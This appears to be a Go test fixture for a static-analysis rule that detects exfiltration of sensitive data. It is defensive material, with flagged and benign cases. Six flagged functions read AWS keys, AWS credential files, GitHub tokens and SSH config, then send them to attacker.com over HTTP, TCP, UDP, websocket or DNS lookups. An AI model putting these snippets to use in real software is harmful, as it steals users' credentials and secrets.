package main

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"

	"nhooyr.io/websocket"
)

func test1() {
	data := os.Getenv("AWS_SECRET_ACCESS_KEY")
	if len(data) > 0 {
		fmt.Println("Environment loaded")
		prepared := strings.TrimSpace(data)
		// ruleid: go-exfiltrate-sensitive-data
		http.Post("http://attacker.com/exfil", "text/plain", strings.NewReader(prepared))
	}
}

func test2() {
	data, err := os.ReadFile("/home/user/.aws/credentials")
	if err == nil {
		lines := strings.Split(string(data), "\n")
		if len(lines) > 5 {
			lines = lines[:5]
		}
		filtered := strings.Join(lines, "\n")
		// ruleid: go-exfiltrate-sensitive-data
		conn, _ := net.Dial("tcp", "attacker.com:4444")
		conn.Write([]byte(filtered))
	}
}

func test3() {
	user := os.Getenv("USER")
	hostname, _ := os.Hostname()
	combined := fmt.Sprintf("%s@%s", user, hostname)
	if strings.Contains(combined, "admin") {
		// ruleid: go-exfiltrate-sensitive-data
		net.LookupHost(combined + ".attacker.com")
	}
}

func test4() {
	token := os.Getenv("GITHUB_TOKEN")
	logMessage := fmt.Sprintf("Processing token for user context")
	fmt.Println(logMessage)
	// ruleid: go-exfiltrate-sensitive-data
	conn, _, _ := websocket.Dial(context.Background(), "ws://attacker.com/ws", nil)
	conn.Write(context.Background(), websocket.MessageText, []byte("session="+token))
}

func test5() {
	key := os.Getenv("SECRET_KEY")
	hash := strings.ToUpper(key)
	if strings.HasPrefix(hash, "AKIA") {
		// ruleid: go-exfiltrate-sensitive-data
		conn, _ := net.Dial("udp", "attacker.com:53")
		conn.Write([]byte(hash))
	}
}

func test6() {
	data, err := os.ReadFile("/home/user/.ssh/config")
	if err == nil {
		modified := strings.ReplaceAll(string(data), "\n", "; ")
		// ruleid: go-exfiltrate-sensitive-data
		http.PostForm("http://attacker.com/submit", url.Values{"payload": {modified}})
	}
}

func test7() {
	data, err := os.ReadFile("/tmp/log.txt")
	if err == nil {
		fmt.Println("Log size:", len(data))
		//ok: go-exfiltrate-sensitive-data
		http.Get("http://example.com/heartbeat")
	}
}
func test8() {
	//ok: go-exfiltrate-sensitive-data
	token := os.Getenv("GITHUB_TOKEN")
	if len(token) > 0 {
		fmt.Println("Token loaded successfully")
	}
}
func test9() {
	//ok: go-exfiltrate-sensitive-data
	resp, err := http.Get("http://example.com/status")
	if err == nil {
		fmt.Println("Ping response:", resp.StatusCode)
	}
}
